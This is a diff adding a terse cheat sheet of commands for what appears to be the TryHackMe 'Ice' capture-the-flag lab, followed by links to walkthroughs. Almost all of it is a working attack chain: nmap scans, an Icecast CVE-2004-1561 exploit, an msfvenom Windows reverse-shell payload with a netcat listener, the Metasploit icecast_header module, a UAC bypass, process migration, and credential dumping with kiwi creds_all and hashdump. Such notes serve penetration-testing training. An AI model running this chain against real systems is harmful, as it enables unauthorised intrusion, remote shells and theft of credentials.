@@ -1,0 +1,50 @@
+nmap -sV -sS -sC -T4 10.10.10.10
+nmap -sS 10.10.10.10
+nmap -T4 -A -p- --script 10.10.10.10 -vv
+nmap --script=vuln 10.10.10.10
+
+searchsploit name
+
+exploit : https://github.com/ivanitlearning/CVE-2004-1561
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
+
+sudo nc -nvlp 443
+
+gcc 568-edit.c -o 568
+chmod +x 568
+./568 10.10.10.10
+
+msfconsole 
+search icecast
+use exploit/windows/http/icecast_header
+show options
+set RHOSTS 10.10.10.10
+run
+
+getsystem
+systeminfo
+
+use post/multi/recon/local_exploit_suggester
+option 
+set lhost tun0
+exploit
+sessions
+use exploit/windows/local/nypassuac_eventvwr
+options
+exploit
+getprivs
+ps
+migrate -N spoolsv.exe
+getuid
+help
+load kiwi
+help
+creds_all
+hashdump
+
+
+https://medium.com/@rameshsmillionaire/tryhackme-ice-writeup-3b16ca786283
+https://medium.com/@lidorrocah123/ice-full-walkthrough-tryhackme-bd4b728a2796
+https://ex0a.medium.com/tryhackme-walkthrough-ice-87f2230168b5
+
+ 
